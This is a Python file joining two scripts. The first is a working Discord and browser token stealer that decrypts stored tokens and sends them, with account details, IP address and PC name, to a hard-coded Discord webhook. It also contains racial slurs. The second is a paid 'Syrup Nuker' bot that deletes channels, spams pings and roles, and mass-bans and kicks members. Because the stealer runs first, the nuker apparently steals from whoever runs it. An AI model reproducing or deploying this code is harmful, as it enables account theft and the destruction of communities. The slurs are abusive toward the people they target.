from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from os import getlogin, listdir
from json import loads
from re import findall
from urllib.request import Request, urlopen
from subprocess import Popen, PIPE
import requests, json, os
from datetime import datetime

tokens = []
cleaned = []
checker = []

def decrypt(buff, master_key):
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except:
        return "Error"
def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except: pass
    return ip
def gethwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
def get_token():
    already_check = []
    checker = []
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    chrome = local + "\\Google\\Chrome\\User Data"
    paths = {
        'Discord': roaming + '\\discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Lightcord': roaming + '\\Lightcord',
        'Discord PTB': roaming + '\\discordptb',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
        'Amigo': local + '\\Amigo\\User Data',
        'Torch': local + '\\Torch\\User Data',
        'Kometa': local + '\\Kometa\\User Data',
        'Orbitum': local + '\\Orbitum\\User Data',
        'CentBrowser': local + '\\CentBrowser\\User Data',
        '7Star': local + '\\7Star\\7Star\\User Data',
        'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
        'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
        'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
        'Chrome': chrome + 'Default',
        'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Defaul',
        'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Iridium': local + '\\Iridium\\User Data\\Default'
    }
    for platform, path in paths.items():
        if not os.path.exists(path): continue
        try:
            with open(path + f"\\Local State", "r") as file:
                key = loads(file.read())['os_crypt']['encrypted_key']
                file.close()
        except: continue
        for file in listdir(path + f"\\Local Storage\\leveldb\\"):
            if not file.endswith(".ldb") and file.endswith(".log"): continue
            else:
                try:
                    with open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
                        for x in files.readlines():
                            x.strip()
                            for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                                tokens.append(values)
                except PermissionError: continue
        for i in tokens:
            if i.endswith("\\"):
                i.replace("\\", "")
            elif i not in cleaned:
                cleaned.append(i)
        for token in cleaned:
            try:
                tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
            except IndexError == "Error": continue
            checker.append(tok)
            for value in checker:
                if value not in already_check:
                    already_check.append(value)
                    headers = {'Authorization': tok, 'Content-Type': 'application/json'}
                    try:
                        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
                    except: continue
                    if res.status_code == 200:
                        res_json = res.json()
                        ip = getip()
                        pc_username = os.getenv("UserName")
                        pc_name = os.getenv("COMPUTERNAME")
                        user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
                        user_id = res_json['id']
                        email = res_json['email']
                        phone = res_json['phone']
                        mfa_enabled = res_json['mfa_enabled']
                        has_nitro = False
                        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
                        nitro_data = res.json()
                        has_nitro = bool(len(nitro_data) > 0)
                        days_left = 0
                        if has_nitro:
                            d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                            d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                            days_left = abs((d2 - d1).days)
                        embed = f"""**{user_name}** *({user_id})*\n
> :dividers: __Account Information__\n\tEmail: `{email}`\n\tPhone: `{phone}`\n\t2FA/MFA Enabled: `{mfa_enabled}`\n\tNitro: `{has_nitro}`\n\tExpires in: `{days_left if days_left else "None"} day(s)`\n
> :computer: __PC Information__\n\tIP: `{ip}`\n\tUsername: `{pc_username}`\n\tPC Name: `{pc_name}`\n\tPlatform: `{platform}`\n
> :piñata: __Token__\n\t`{tok}`\n
*Made by A NIGGER* **|** ||https://github.com/XDevyy||"""
                        payload = json.dumps({'content': embed, 'username': 'Token Grabber - ahh i fuck niggers', 'avatar_url': 'https://cdn.discordapp.com/attachments/826581697436581919/982374264604864572/atio.jpg'})
                        try:
                            headers2 = {
                                'Content-Type': 'application/json',
                                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
                            }
                            req = Request('https://discord.com/api/webhooks/1265736787456950382/pUMFMI-rqJQBxkGrorp5Zw1zjXd1qDBLhMtjJQCSUzWwpoArNnmyuxFeUEVdDXas_Z37', data=payload.encode(), headers=headers2)
                            urlopen(req)
                        except: continue
                else: continue
if __name__ == '__main__':
    get_token()


import ctypes
import requests
import discord
from discord.ext import commands
from colorama import Fore
from pystyle import Colors, Colorate
import time
import random
import string
import os
import threading
import asyncio
import requests
import os
import requests
from pystyle import Center

# Function to get PC name
def get_pc_name():
    return os.getenv('COMPUTERNAME')

def set_console_title(title):
    ctypes.windll.kernel32.SetConsoleTitleW(title)

# Change the console title at the start of the program
set_console_title("Syrup Nuker - Starting...")


def get_bot_token():
    return input(Fore.CYAN + 'Input Bot Token: ')

client = commands.Bot(command_prefix=".",
                      intents=discord.Intents.all())

async def run_bot_command(command):
    fake_message = discord.Message(content=command)
    await client.process_commands(fake_message)

def console_input_thread():
    while True:
        command = input("Enter a bot command (e.g., .nuke): ")
        if command.startswith("."):
            asyncio.run(run_bot_command(command))
        else:
            print("Invalid command. Commands must start with '.'")

@client.event
async def on_ready():
    set_console_title(f"Syrup Nuker - Logins: {len(client.guilds)} ")  # Set console title with server count

    print(Colorate.Horizontal(Colors.red_to_purple, """
    
     ██████▓██   ██▓ ██▀███   █    ██  ██▓███  
   ▒██    ▒ ▒██  ██▒▓██ ▒ ██▒ ██  ▓██▒▓██░  ██▒
   ░ ▓██▄    ▒██ ██░▓██ ░▄█ ▒▓██  ▒██░▓██░ ██▓▒
     ▒   ██▒ ░ ▐██▓░▒██▀▀█▄  ▓▓█  ░██░▒██▄█▓▒ ▒
   ▒██████▒▒ ░ ██▒▓░░██▓ ▒██▒▒▒█████▓ ▒██▒ ░  ░
   ▒ ▒▓▒ ▒ ░  ██▒▒▒ ░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒ ▒▓▒░ ░  ░
   ░ ░▒  ░ ░▓██ ░▒░   ░▒ ░ ▒░░░▒░ ░ ░ ░▒ ░     
   ░  ░  ░  ▒ ▒ ░░    ░░   ░  ░░░ ░ ░ ░░       
         ░  ░ ░        ░        ░              
            ░ ░                                
                               5$/copy
                          Written by XeniDev
        """,1))
    
    print(Fore.CYAN + "Logged in as {}".format(client.user))

    server_list = ["SERVER LOGINS:"]
    for guild in client.guilds:
        server_list.append(f"    {guild.name}")

    print(Fore.WHITE + "\n".join(server_list))

LicenseKey = input(Fore.CYAN + 'Input License Key: ')
if LicenseKey == "admin":
    print(Fore.CYAN + "Key is Valid!")
    print(Fore.CYAN + "Validating connection to the server...")
    time.sleep(2)
else:
    print(Fore.RED + "Invalid Key!")
    print(Fore.RED + "Press Enter to quit!")
    input("")
    exit(123)

@client.command()
async def nuke(ctx):
    await ctx.message.delete()
    await ctx.guild.edit(name="TRASHED BY SYRUP LOL")
    try:
        for channels in ctx.guild.channels:
            await channels.delete()
            print("deleted {}".format(channels))
    except:
        print("Can't delete {}".format(channels))

    while True:
        await ctx.guild.create_text_channel("NUKE BY SYRUP")

@client.event
async def on_guild_channel_create(channel):
    while True:
        await channel.send("@everyone @here NUKED BY SYRUP SQUAD LMFAO! https://share.creavite.co/dZFiowKAbCVLEsG0.gif")

@client.command()
async def rolespam(ctx):
    await ctx.message.delete()
    for i in range(100):
        await ctx.guild.create_role(name="FUCKED BY SYRUP !!!")

@client.command()
async def ownerspam(ctx):
    owner = ctx.guild.owner
    while True:
        await owner.send("imagine getting nuked! :skull:")

@client.command()
async def guildname(ctx, *, newname):
    await ctx.message.delete()
    await ctx.guild.edit(name=newname)

@client.command()
async def massban(ctx):
    try:
        for members in ctx.guild.members:
            await members.ban(reason="NUKED BY SYRUP ")
            print(Fore.GREEN + f"banned {members}")
    except:
        print(Fore.RED + f"can't ban {members}")

@client.command()
async def kickall(ctx):
    try:
        for members in ctx.guild.members:
            await members.kick(reason="NUKED BY SYRUP ")
            print(Fore.GREEN + f"kicked {members}")
    except:
        print(Fore.RED + f"can't kick {members}")

if __name__ == "__main__":
    bot_token = get_bot_token()
    asyncio.run(client.start(bot_token))

    input_thread = threading.Thread(target=console_input_thread)
    input_thread.start()

